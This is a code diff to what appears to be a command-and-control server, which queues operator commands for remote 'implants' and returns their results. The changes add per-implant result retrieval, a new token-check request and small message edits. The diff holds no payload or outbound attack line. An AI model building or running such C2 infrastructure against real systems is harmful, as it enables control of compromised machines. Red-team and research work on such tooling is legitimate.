@@ -287,6 +287,24 @@ def get_results(user_id):
     return fetched
 
 
+def get_results_by_implant(user_id, implant_id):
+    """
+    Get and remove the entry for a specific implant_id under a specific user.
+    :param user_id: The user ID to search within.
+    :param implant_id: The implant ID to fetch and remove the entry for.
+    :return: The entry value if found and removed, or None.
+    """
+    user_results = result_storage.get(user_id, [])
+    for i, entry in enumerate(user_results):
+        if implant_id in entry:
+            # Remove the entry from the list and return the value
+            value = entry.pop(implant_id)
+            if not entry:  # If the dictionary is empty after pop, remove it from the list
+                user_results.pop(i)
+            return value
+    return None  # Return None if no matching implant_id is found
+
+
 def get_waiting_command(implant_id):
     """
     Gets the oldest command waiting in the implants queue
@@ -311,7 +329,7 @@ def get_unique_results_for_user(user_id):
     """
     Get all unique client IDs for a specific user from result_storage.
     :param user_id: The user ID to fetch client IDs for.
-    :return: A set of unique client IDs for the user.
+    :return: A set of unique implant IDs with pending results for the user.
     """
     user_results = result_storage.get(user_id, [])
     if not user_results:
@@ -369,7 +387,7 @@ def handle_client(client_socket, client_id):
         request_type, uname, *remainder = client_request.split(" ", 2)
         pending_res = get_unique_results_for_user(uname)
         if pending_res is not False and request_type != "RTR":
-            client_socket.send(f"Results from {pending_res} pending for you".encode())
+            client_socket.send(f"Results from implant(s) {pending_res} pending for you".encode())
 
         match request_type:
             case "AUTH":
@@ -391,7 +409,7 @@ def handle_client(client_socket, client_id):
                 if token in operator_session_tokens:
                     command = command[0] if command else ""
                     add_command(implant_id, uname, command)
-                    client_socket.send("Command queued\n".encode())
+                    client_socket.send("Command queued".encode())
                     logger.info(f"Command: {command} added to queue for implant: {implant_id}")
                 else:
                     logger.error("bad token")
@@ -399,10 +417,10 @@ def handle_client(client_socket, client_id):
 
             case "RTR":
                 logger.info("controller requesting implant last messages")
-                request_type, uname, token, *message = client_request.split(" ", 3)
+                request_type, uname, token, implant_id, *message = client_request.split(" ", 4)
                 logger.info(f"checking session token")
                 if token in operator_session_tokens:
-                    results = get_results(uname)
+                    results = get_results_by_implant(uname, implant_id)
                     client_socket.send(results.encode())
                     logger.info(f"sent controller results {results}")
                 else:
@@ -447,6 +465,15 @@ def handle_client(client_socket, client_id):
                 else:
                     client_socket.send(f"Bad token\n".encode())
                     logger.error("bad token, couldn't refresh routes")
+
+            case "EMT":
+                logger.info("empty request, client app refreshing")
+                request_type, uname, token, *message = client_request.split(" ", 3)
+                if token in operator_session_tokens:
+                    client_socket.send("Token authenticated".encode())
+                else:
+                    client_socket.send(f"Bad token\n".encode())
+                    logger.error("bad token")
 
             case _:
                 logger.error(f"unknown command: {request_type}")
